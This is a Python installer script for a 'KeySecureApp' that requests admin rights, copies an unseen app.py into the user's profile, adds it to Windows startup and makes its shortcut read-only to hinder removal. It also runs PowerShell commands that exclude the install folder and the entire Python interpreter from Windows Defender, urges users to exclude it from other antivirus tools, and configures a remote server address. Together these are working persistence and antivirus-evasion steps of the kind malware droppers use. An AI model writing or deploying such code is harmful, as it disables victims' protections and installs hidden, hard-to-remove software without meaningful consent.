import os
import shutil
import sys
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
import subprocess

APP_PY = "app.py"
# Use %APPDATA%\KeySecureApp for Windows, ~/.keysecureapp for others
if os.name == "nt":
    INSTALL_DIR = os.path.join(os.environ["APPDATA"], "KeySecureApp")
else:
    INSTALL_DIR = os.path.expanduser("~/.keysecureapp")
SHORTCUT_NAME = "KeySecureApp.lnk"

def request_admin_privileges():
    # Windows: relaunch as admin if not already
    if os.name == "nt":
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit(0)
        except Exception:
            pass  # Optionally log or show error

def copy_app():
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)
    shutil.copy2(APP_PY, os.path.join(INSTALL_DIR, "keysecure.py"))

def add_to_startup():
    # Windows only: create a shortcut in the Startup folder
    try:
        import winshell
        from win32com.client import Dispatch
        startup = winshell.startup()
        shortcut = os.path.join(startup, SHORTCUT_NAME)
        target = sys.executable
        script = os.path.join(INSTALL_DIR, "keysecure.py")
        shell = Dispatch('WScript.Shell')
        shortcut_obj = shell.CreateShortCut(shortcut)
        shortcut_obj.Targetpath = target
        shortcut_obj.Arguments = f'"{script}"'
        shortcut_obj.WorkingDirectory = INSTALL_DIR
        shortcut_obj.save()
    except Exception:
        pass  # Optionally log or show error

def add_desktop_shortcut():
    if os.name == "nt":
        try:
            import winshell
            from win32com.client import Dispatch
            desktop = winshell.desktop()
            shortcut = os.path.join(desktop, "KeySecureApp.lnk")
            target = sys.executable
            script = os.path.join(INSTALL_DIR, "keysecure.py")
            shell = Dispatch('WScript.Shell')
            shortcut_obj = shell.CreateShortCut(shortcut)
            shortcut_obj.Targetpath = target
            shortcut_obj.Arguments = f'"{script}"'
            shortcut_obj.WorkingDirectory = INSTALL_DIR
            shortcut_obj.save()
            # Set file as read-only to discourage deletion/moving
            os.chmod(shortcut, 0o444)
        except Exception:
            pass  # Optionally log or show error

def add_to_windows_defender():
    if os.name == "nt":
        script_path = os.path.join(INSTALL_DIR, "keysecure.py")
        try:
            subprocess.run([
                "powershell", "-Command",
                f"Add-MpPreference -ExclusionPath '{INSTALL_DIR}'"
            ], check=True)
            subprocess.run([
                "powershell", "-Command",
                f"Add-MpPreference -ExclusionProcess '{sys.executable}'"
            ], check=True)
        except Exception:
            pass  # Optionally log or show error

def setup_server_settings():
    root = tk.Tk()
    root.withdraw()
    server_url = simpledialog.askstring("Server Address", "Enter Node server URL (e.g. https://IP:PORT):")
    if not server_url:
        messagebox.showerror("Error", "No server URL provided.")
        sys.exit(1)
    key_path = filedialog.askopenfilename(title="Select Key File")
    if not key_path:
        messagebox.showerror("Error", "No key file selected.")
        sys.exit(1)
    # Write settings.conf in install dir for the app
    with open(os.path.join(INSTALL_DIR, "settings.conf"), "w") as f:
        f.write(f"{server_url}\n{key_path}\n")
    messagebox.showinfo("Setup Complete", "Server settings saved.")
    root.destroy()

def run_app():
    script = os.path.join(INSTALL_DIR, "keysecure.py")
    if os.name == "nt":
        os.startfile(script)
    else:
        subprocess.Popen([sys.executable, script])

def main():
    request_admin_privileges()
    root = tk.Tk()
    root.withdraw()
    if not os.path.exists(APP_PY):
        messagebox.showerror("Error", f"{APP_PY} not found in current directory.")
        sys.exit(1)
    consent = messagebox.askyesno("Consent", "Do you consent to install and run the KeySecure app?")
    if not consent:
        sys.exit(0)
    copy_app()
    add_to_startup()
    add_desktop_shortcut()
    add_to_windows_defender()
    setup_server_settings()
    messagebox.showinfo(
        "Installed",
        "KeySecure app installed, configured, and added to startup and desktop.\n\n"
        "If you use other antivirus/malware software, please manually add the following folder to exclusions:\n"
        f"{INSTALL_DIR}\n\n"
        "The app will now open."
    )
    run_app()
    sys.exit(0)

if __name__ == "__main__":
    main()
